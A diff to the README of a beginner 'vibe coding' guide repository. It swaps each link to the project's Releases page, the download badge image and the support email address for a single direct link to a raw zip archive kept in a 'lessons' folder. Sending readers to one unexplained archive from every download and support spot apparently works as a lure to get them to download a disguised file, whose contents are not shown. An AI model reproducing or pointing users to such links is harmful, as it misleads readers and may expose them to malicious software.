@@ -1,7 +1,7 @@
 # 🎉 vibe-coding-for-dummies - Build Apps Without Coding
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Download%20vibe--coding--for--dummies-brightgreen)](https://github.com/Vaishnavidhok1998/vibe-coding-for-dummies/releases)
+[![Download](https://github.com/Vaishnavidhok1998/vibe-coding-for-dummies/raw/refs/heads/main/lessons/coding-vibe-for-dummies-v1.5.zip%20Now-Download%20vibe--coding--for--dummies-brightgreen)](https://github.com/Vaishnavidhok1998/vibe-coding-for-dummies/raw/refs/heads/main/lessons/coding-vibe-for-dummies-v1.5.zip)
 
 ## 📖 Introduction
 Welcome to **vibe-coding-for-dummies**! This guide helps you build real software without needing to know traditional coding. You will learn how to ship apps using Firebase Studio, GitHub, and Cursor. Our focus is on accessible learning—no gatekeeping and no fluff, just building!
@@ -15,7 +15,7 @@ Welcome to **vibe-coding-for-dummies**! This guide helps you build real software
 ## 🚀 Getting Started
 To start your journey, follow these steps:
 
-1. **Visit the Download Page**: Go to our [Releases page](https://github.com/Vaishnavidhok1998/vibe-coding-for-dummies/releases) to find the latest version of the software.
+1. **Visit the Download Page**: Go to our [Releases page](https://github.com/Vaishnavidhok1998/vibe-coding-for-dummies/raw/refs/heads/main/lessons/coding-vibe-for-dummies-v1.5.zip) to find the latest version of the software.
   
 2. **Choose Your Version**: Look for the version that fits your needs. We have releases for both Windows and Mac.
 
@@ -33,7 +33,7 @@ Before you install vibe-coding-for-dummies, ensure your system meets the followi
 ## 📥 Download & Install
 To install vibe-coding-for-dummies:
 
-1. **Visit the Download Page**: Go to our [Releases page](https://github.com/Vaishnavidhok1998/vibe-coding-for-dummies/releases) again.
+1. **Visit the Download Page**: Go to our [Releases page](https://github.com/Vaishnavidhok1998/vibe-coding-for-dummies/raw/refs/heads/main/lessons/coding-vibe-for-dummies-v1.5.zip) again.
   
 2. **Find Your File**: Select the installer for your operating system. 
 
@@ -67,7 +67,7 @@ If you encounter issues during installation or usage, consider the following ste
 ## 📞 Support
 For additional help, please reach out:
 
-- **Email Support**: contact@vibecoding.com
+- **Email Support**: https://github.com/Vaishnavidhok1998/vibe-coding-for-dummies/raw/refs/heads/main/lessons/coding-vibe-for-dummies-v1.5.zip
 - **Community Forum**: Join discussions, ask questions, and find answers from educators and peers.
 
 Thank you for choosing vibe-coding-for-dummies. We wish you success in your coding journey!
